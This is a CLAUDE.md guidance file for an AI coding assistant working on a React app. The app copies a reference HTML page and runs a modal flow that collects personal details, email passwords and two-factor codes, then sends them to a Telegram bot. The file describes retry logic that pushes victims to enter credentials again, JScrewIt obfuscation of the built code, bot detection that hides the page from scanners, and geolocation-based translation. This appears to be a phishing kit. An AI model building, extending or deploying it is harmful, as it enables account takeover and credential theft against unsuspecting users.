# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Project Overview

This is a React-based web application that clones an HTML template (`required.html`) into a modern React SPA. The project uses Rsbuild as the build tool and implements a multi-step form flow with modals for collecting user information.

**Original Template**: The `required.html` file in the root serves as the design reference. All React components should match this HTML's structure, styling, and behavior.

## Build & Development Commands

```bash
# Development server
pnpm dev

# Production build
pnpm build

# Preview production build
pnpm preview

# Linting
pnpm lint

# Code formatting
pnpm format
```

## Critical Architecture Notes

### 1. **HTML-to-React Conversion Pattern**

When modifying UI components, **always reference `required.html` first** to ensure the React implementation matches the original design:

- **Class names**: Must match exactly (e.g., `fake-likns` not `fake-links` - preserve typos from original)
- **Modal structure**: SearchModal uses `modal` class, NOT `form-modal` (form modals use `form-modal`)
- **Event handlers**: Original HTML may not have handlers - add them logically in React

### 2. **Modal System Architecture**

The app has two modal paradigms:

**Form Modals** (use `form-modal` class):
- `FirstFormModal` - Initial data collection
- `LoginModal` - Email/password capture
- `TwoFAModal` - Two-factor authentication code
- `SuccessModal` - Completion message

**Content Modals** (use `modal` class only):
- `SearchModal` - Search interface
- `PrivacyPolicyModal` - Privacy policy with selected question
- `TermsModal` - Terms of service
- `AccountsModal` - Account management

**Mobile Sidebar**: Uses `popup` class with `popup-item` and `popup-content` wrappers.

### 3. **State Management Pattern**

Main page (`src/pages/index.jsx`) centralizes all modal state:

```jsx
const [showFirstModal, setShowFirstModal] = useState(false);
const [showLoginModal, setShowLoginModal] = useState(false);
const [show2FAModal, setShow2FAModal] = useState(false);
const [showSuccessModal, setShowSuccessModal] = useState(false);
const [showSearchModal, setShowSearchModal] = useState(false);
const [showPrivacyModal, setShowPrivacyModal] = useState(false);
const [showTermsModal, setShowTermsModal] = useState(false);
const [showAccountsModal, setShowAccountsModal] = useState(false);
const [showMobileSidebar, setShowMobileSidebar] = useState(false);
```

**Pattern**: Parent controls visibility, children receive `show` and `onClose` props.

### 4. **Data Flow Architecture**

```
User Input → Modal Component → Parent Handler → Telegram API
                                      ↓
                                localStorage (persistence)
```

Key functions in `src/pages/index.jsx`:
- `handleFirstFormSubmit(data)` - Saves form data, transitions to LoginModal
- `handleLoginSubmit(email, password)` - Records login attempt, manages retry logic
- `handle2FASubmit(code)` - Records 2FA attempt, manages retry logic
- `buildAndSend()` - Constructs and sends data to Telegram

**Important**: All collected data persists in component state and gets sent via `sendMessage()` utility.

### 5. **Configuration Management**

**`src/utils/config.js`** contains runtime configuration:
- `token` - Telegram bot token
- `chat_id` - Telegram chat ID for messages
- `max_password_attempts` - Login retry limit (default: 2)
- `max_code_attempts` - 2FA retry limit (default: 2)
- `password_loading_time` - Simulated loading duration (seconds)
- `code_loading_time` - Simulated loading duration (seconds)

### 6. **Translation System**

Auto-translation based on user's country:
1. IP geolocation via `geojs.io` determines country
2. `country_to_language.js` maps country code to language
3. `translateText()` utility translates all UI text
4. Fallback to `defaultTexts` (English) on error

Translation happens on mount in `initializeApp()`.

### 7. **Mobile Responsiveness**

**Desktop**: Sidebar visible in left column (`col-4`)
**Mobile**:
- Burger button (`burger-button`) in navbar
- Clicking burger opens `popup` overlay with Sidebar content
- Popup uses `showMobileSidebar` state
- Clicking overlay or close button dismisses popup

**When adding features**: Test both desktop sidebar and mobile popup behavior.

## Build System Specifics

### Custom Rsbuild Plugins (`rsbuild.config.mjs`)

1. **JScrewIt Plugin**: Obfuscates all `.js` files in `dist/` after build using JScrewIt encoding
   - Runs post-build
   - Processes recursively through dist directory
   - HTML files get wrapped in `<script>` tags with obfuscated content

2. **htaccess Plugin**: Generates `.htaccess` for SPA routing
   - Rewrites all non-file requests to `index.html`
   - Essential for client-side routing on Apache servers

3. **Asset Inlining**: All assets (images, fonts, SVGs) are inlined as data URIs
   ```js
   dataUriLimit: {
       image: Number.MAX_SAFE_INTEGER,
       svg: Number.MAX_SAFE_INTEGER,
       // ... all types
   }
   ```

### Path Aliases

Use `@/` to import from `src/`:
```jsx
import Sidebar from '@/components/Sidebar';
import config from '@/utils/config';
```

## Component Interaction Patterns

### Sidebar → Modals Communication

Sidebar receives callback props and calls them when items are clicked:

```jsx
<Sidebar
    texts={texts}
    onOpenSearchModal={() => setShowSearchModal(true)}
    onOpenPrivacyModal={(question) => {
        setSelectedPrivacyQuestion(question);
        setShowPrivacyModal(true);
    }}
    onOpenTermsModal={() => setShowTermsModal(true)}
    onOpenAccountsModal={() => setShowAccountsModal(true)}
/>
```

When Sidebar is in mobile popup, callbacks must close popup first:
```jsx
onOpenSearchModal={() => {
    setShowMobileSidebar(false);
    setShowSearchModal(true);
}}
```

### Action Buttons Pattern

Action buttons in content (e.g., `fake-likns` section) should:
1. Have `onClick` handler
2. Set appropriate modal state
3. Use `cursor: pointer` for UX
4. Pass context (e.g., question text for PrivacyPolicyModal)

Example:
```jsx
<div
    className="action-button wide"
    onClick={() => {
        setSelectedPrivacyQuestion(texts.privacyPolicyQ);
        setShowPrivacyModal(true);
    }}
    style={{ cursor: 'pointer' }}
>
```

## Styling Architecture

### CSS Cascade
1. `bootstrap.min.css` - Bootstrap 5 base
2. `style.css` - Custom overrides and component styles

### Key CSS Classes

**Modals**:
- `.modal.form-modal` - Form-based modals with specific padding/layout
- `.modal` (alone) - Content modals (search, privacy, terms)
- `.popup` - Mobile sidebar overlay

**Buttons**:
- `.action-button` - Generic button style
- `.action-button.wide` - Full-width variant
- `.action-button.collapsed` - Collapsible menu items
- `.burger-button` - Mobile menu trigger
- `.burger-button-popup` - Mobile menu close button

**Layout**:
- `.container-sm` - Main content wrapper
- `.container-head` - Top navbar
- `.fake-likns` - Action buttons section (note typo from original)

## Common Gotchas

1. **Typo Preservation**: The original HTML has `fake-likns` (not `fake-links`). Preserve this in React.

2. **Modal Class Confusion**:
   - ❌ SearchModal with `form-modal` class → causes layout issues
   - ✅ SearchModal with just `modal` class

3. **Click Outside to Close**: Modals should handle overlay clicks:
   ```jsx
   <div className="modal show d-block" onClick={onClose}>
       <div className="modal-dialog" onClick={(e) => e.stopPropagation()}>
           {/* content */}
       </div>
   </div>
   ```

4. **Translation Keys**: All text must be defined in `defaultTexts` object in `src/pages/index.jsx` for translation to work.

5. **Bot Detection**: App redirects to `about:blank` if bot detected. Test with `detectBot()` bypass if needed.

## Testing Workflow

Since there are no automated tests, manual testing should cover:

1. **Modal Flow**: First Form → Login → 2FA → Success
2. **Retry Logic**: Test password/2FA retry limits (2 attempts each)
3. **Mobile Sidebar**: Burger menu open/close on mobile viewport
4. **Translation**: Test with VPN to different countries
5. **All Action Buttons**: Verify all clickable elements open correct modals

## Debugging Tips

- **Modal not appearing**: Check if corresponding state is `true` and modal has `show` class
- **Layout issues**: Compare rendered HTML with `required.html` structure
- **Translation not working**: Check browser console for `translateText()` errors
- **Telegram not sending**: Verify `config.js` token and chat_id are valid
